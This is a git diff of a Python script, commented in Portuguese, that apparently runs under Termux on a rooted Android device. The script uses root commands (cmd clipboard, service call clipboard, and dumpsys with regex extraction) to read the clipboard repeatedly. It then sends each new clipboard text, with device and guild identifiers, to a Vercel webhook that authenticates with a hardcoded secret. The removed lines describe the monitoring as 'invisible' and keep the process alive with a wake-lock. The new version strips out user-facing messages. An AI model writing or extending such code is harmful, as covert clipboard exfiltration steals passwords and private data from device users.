@@ -2,6 +2,7 @@ import sys
 import time
 import subprocess
 import requests
+import re
 
 if len(sys.argv) < 3:
     sys.exit(1)
@@ -12,72 +13,50 @@ URL_WEBHOOK = "https://hapiephoneugph.vercel.app/api/webhook"
 AUTH_SECRET = "ugphoneoficialbrasil13willianz4z4oof$$$pitucho13"
 headers = {"Content-Type": "application/json", "Authorization": AUTH_SECRET}
 
-# Evita que o Android mate o processo
-subprocess.run("termux-wake-lock", shell=True, check=False)
-print(f"🚀 Iniciando monitoramento invisível (Device: {device_id})")
-
-def get_clipboard_invisivel():
+def get_clipboard_brute_force():
     try:
-        # PLANO A: Tenta ler com caminho absoluto do sistema (Garante que o root ache o comando)
-        result = subprocess.run(
-            ['su', '-c', '/system/bin/cmd clipboard get-text'], 
-            capture_output=True, text=True, timeout=3
-        )
-        output = result.stdout.strip()
+        # TENTATIVA 1: Comando padrão via ROOT
+        res = subprocess.run(['su', '-c', 'service call clipboard 2'], capture_output=True, text=True, timeout=2)
+        # Este comando retorna um dump hexadecimal, vamos tentar o básico primeiro:
+        res_basic = subprocess.run(['su', '-c', 'cmd clipboard get-text'], capture_output=True, text=True, timeout=2)
+        output = res_basic.stdout.strip()
         
-        # PLANO B: Se o plano A voltar vazio ou der erro, tenta usar a API do Termux
-        if not output or output == "null" or "Error" in output:
-            try:
-                res_termux = subprocess.run(['termux-clipboard-get'], capture_output=True, text=True, timeout=2)
-                output = res_termux.stdout.strip()
-            except:
-                pass
+        if output and output != "null":
+            return output
 
-        if output == "null" or output == "":
-            return ""
+        # TENTATIVA 2: Dumpsys Completo (Extração via Regex)
+        # Procuramos por qualquer coisa dentro de 'items={' ou 'text='
+        res_dump = subprocess.run(['su', '-c', 'dumpsys clipboard'], capture_output=True, text=True, timeout=3)
+        dump_text = res_dump.stdout
+        
+        # Procura padrões comuns de texto no dump do Android
+        matches = re.findall(r"text=([^,\}\n]+)", dump_text)
+        if matches:
+            return matches[-1].strip() # Pega o item mais recente
             
-        return output
-    except Exception as e:
+        return ""
+    except:
         return ""
 
-last_clip = get_clipboard_invisivel()
-print(f"🔍 [DEBUG] Leitura inicial do clipboard: '{last_clip[:20]}'")
+print(f"🚀 Monitoramento Bruto Iniciado (Device: {device_id})")
+last_clip = get_clipboard_brute_force()
 
 while True:
     try:
-        current = get_clipboard_invisivel()
+        current = get_clipboard_brute_force()
         
         if current and current != last_clip:
-            print(f"\n📋 Novo texto detectado: '{current[:30]}...'")
-            print("🚀 Enviando para a Vercel...")
-            
-            try:
-                resposta = requests.post(
+            # Filtra apenas se o texto for minimamente válido
+            if len(current) > 0:
+                requests.post(
                     URL_WEBHOOK, 
                     json={"texto": current, "device_id": device_id, "guild_id": guild_id}, 
                     headers=headers, 
                     timeout=5
                 )
-                
-                if resposta.status_code == 200:
-                    print("✅ Sucesso! Texto processado pela Vercel.")
-                    last_clip = current 
-                    try:
-                        with open("last_activity.txt", "w") as f:
-                            f.write(str(time.time()))
-                    except:
-                        pass
-                else:
-                    print(f"❌ Vercel recusou o envio (Erro {resposta.status_code})")
-                    
-            except requests.exceptions.RequestException as e:
-                print(f"❌ Falha de conexão com a Vercel: {e}")
-                
-    except KeyboardInterrupt:
-        # Se for fechado, sai de fininho sem cuspir erro na tela
-        print("\n🛑 Monitoramento encerrado pelo sistema.")
-        break
-    except Exception as e:
+                last_clip = current
+                with open("last_activity.txt", "w") as f: f.write(str(time.time()))
+    except:
         pass
         
     time.sleep(2)
